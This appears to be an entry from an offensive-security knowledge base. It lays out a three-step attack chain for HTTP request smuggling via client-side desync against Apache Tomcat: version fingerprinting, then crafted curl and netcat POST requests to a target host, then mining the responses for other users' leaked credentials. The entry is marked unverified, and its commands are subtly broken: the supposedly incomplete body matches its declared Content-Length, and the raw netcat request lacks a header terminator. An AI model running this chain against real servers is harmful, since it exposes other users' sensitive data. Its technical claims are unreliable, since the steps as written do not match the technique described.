---
tags:
  - http-request-smuggling
  - client-side-desync
  - information-disclosure
  - tomcat
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/netcat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-send-incomplete-post]]'
  - '[[commands/netcat-send-http-request]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Identify-Vulnerable-Apache-Tomcat-Server]]'
  - '[[procedures/Craft-and-Send-Incomplete-POST-Request]]'
  - '[[procedures/Analyze-Response-for-Leaked-Data]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of Apache Tomcat vulnerability through HTTP Request Smuggling
  using Client-Side Desync to disclose sensitive information from server
  responses.
skill_level: intermediate
impact_level: high
id: 00af098a-b711-4cee-9a56-2ff6a72df834
created_at: '2025-12-13T09:01:22.520Z'
updated_at: '2025-12-13T09:01:22.520Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Apache Tomcat HTTP Request Smuggling via Client-Side Desync for Information Disclosure

Multi-stage attack chain demonstrating exploitation of a Client-Side Desync vulnerability in Apache Tomcat to cause information disclosure through desynchronized HTTP requests.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[Exploitation]
    B --> C[Data Analysis]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/netcat]]

### Target Environment

- Web application running Apache Tomcat (versions 8.5.7 to 8.5.63 or 9.0.0-M11 to 9.0.43)
- Open HTTP/HTTPS ports (e.g., 80, 8080, 443)
- Network access to the target server

### Initial Access Requirements

- No credentials required
- External network position to send HTTP requests
- No prior access needed

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Apache Tomcat Server
procedure: [[procedures/Identify-Vulnerable-Apache-Tomcat-Server]]

**Objective**: Scan and confirm the presence of a vulnerable Apache Tomcat instance.

**Instructions**: Use basic reconnaissance to identify the server version. For example, send a standard HTTP request using [[commands/curl-send-incomplete-post]] to check headers:

```bash
curl -I http://target.com
```

Look for 'Server: Apache-Coyote/1.1' or similar indicators of Tomcat. Verify version against affected ranges (8.5.7-8.5.63 or 9.0.0-M11-9.0.43).

**Expected Output**: HTTP response headers indicating Tomcat version.

**Success Indicators**:
- Tomcat server identified
- Version within vulnerable range

### Step 2: Craft and Send Incomplete POST Request
procedure: [[procedures/Craft-and-Send-Incomplete-POST-Request]]

**Objective**: Trigger Client-Side Desync by sending an incomplete POST request to desynchronize connections.

**Instructions**: Craft an HTTP/1.1 POST request with Content-Length set to 6 but provide an incomplete body. Execute using [[commands/curl-send-incomplete-post]]:

```bash
curl -X POST http://target.com/ -H 'Content-Length: 6' --data 'incomp'
```

Alternatively, use [[commands/netcat-send-http-request]] for more control:

```bash
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp' | nc target.com 80
```

**Expected Output**: Server error response potentially containing data from previous requests.

**Success Indicators**:
- Desynchronization triggered
- Error response received

### Step 3: Analyze Response for Leaked Data
procedure: [[procedures/Analyze-Response-for-Leaked-Data]]

**Objective**: Examine the server response for disclosed sensitive information.

**Instructions**: Capture and inspect the response from the desynchronized request. Look for leaked data such as clear-text credentials. Use tools like curl or netcat to pipe output to a file for analysis:

```bash
curl -X POST http://target.com/ -H 'Content-Length: 6' --data 'incomp' > response.txt
```

Review response.txt for anomalies or leaked content from prior user requests.

**Expected Output**: Response body with potentially sensitive data.

**Success Indicators**:
- Sensitive information disclosed in response
- Confirmation of data leakage

## Attack Chain Summary

### Key Achievements

1. Identification of vulnerable Tomcat server
2. Successful triggering of Client-Side Desync
3. Disclosure of sensitive information like credentials

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

*Last updated: 2024-10-01*
